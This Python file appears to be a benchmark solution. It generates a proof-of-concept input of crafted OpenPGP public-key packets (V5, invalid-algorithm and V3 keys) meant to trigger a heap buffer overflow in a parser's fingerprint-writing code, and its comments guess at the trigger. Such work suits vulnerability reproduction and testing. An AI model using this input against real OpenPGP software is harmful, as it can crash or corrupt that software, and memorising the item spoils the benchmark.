import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers a Heap Buffer Overflow in the OpenPGP fingerprint writing logic.
        The vulnerability likely arises when handling a key version (e.g., V5) or algorithm that produces
        a larger fingerprint (32 bytes) than the code expects (20 bytes for V4), or when error handling
        for invalid keys is insufficient, leading to writing invalid state.
        """
        
        # Helper to encode an MPI (Multi-Precision Integer)
        # Format: 2-byte big-endian bit length, followed by the raw bytes
        def encode_mpi(data: bytes) -> bytes:
            bit_len = len(data) * 8
            return struct.pack('>H', bit_len) + data

        # Helper to create an OpenPGP Public Key Packet (Tag 6)
        def create_packet(version: int, timestamp: int, algo: int, mpi_list: list) -> bytes:
            # Packet Body Construction
            body = bytearray()
            body.append(version)
            body.extend(struct.pack('>I', timestamp))
            body.append(algo)
            for mpi in mpi_list:
                body.extend(mpi)
            
            # Packet Header Construction
            # Tag 6 (Public Key). Using Old Format packet header.
            # 0x99 = 10011001 => Tag 6 (000110), Length Type 1 (2 bytes)
            header = bytearray()
            header.append(0x99)
            header.extend(struct.pack('>H', len(body)))
            
            return header + body

        # Construct RSA Key Components
        # Modulus n: 1024 bits (128 bytes) of dummy data
        n = b'\xCC' * 128
        # Exponent e: 65537
        e = b'\x01\x00\x01'
        
        mpis = [encode_mpi(n), encode_mpi(e)]
        
        poc = bytearray()

        # 1. Valid Version 4 RSA Key
        # This helps initialize the parser and heap state correctly.
        poc.extend(create_packet(4, 0x60000000, 1, mpis))

        # 2. Version 5 Key (Primary Trigger Candidate)
        # OpenPGP V5 keys (Draft/RFC 4880bis) use SHA-256 for fingerprints (32 bytes).
        # Legacy code often allocates 20 bytes (SHA-1/V4) or 16 bytes (MD5/V3).
        # A V5 key processed by such code can trigger a heap buffer overflow when writing the fingerprint.
        poc.extend(create_packet(5, 0x60000000, 1, mpis))

        # 3. Version 4 Key with Invalid Algorithm (Secondary Trigger Candidate)
        # The description mentions "surrounding code does not return an error when a step fails".
        # An invalid algorithm might cause the parsing step to "fail" (log only), leaving
        # internal structures uninitialized or in a bad state, followed by a fingerprint write attempt.
        poc.extend(create_packet(4, 0x60000000, 255, mpis))
        
        # 4. Version 3 Key (Legacy)
        # Included to cover potential regressions in legacy V3 (MD5) support.
        poc.extend(create_packet(3, 0x60000000, 1, mpis))
        
        return bytes(poc)
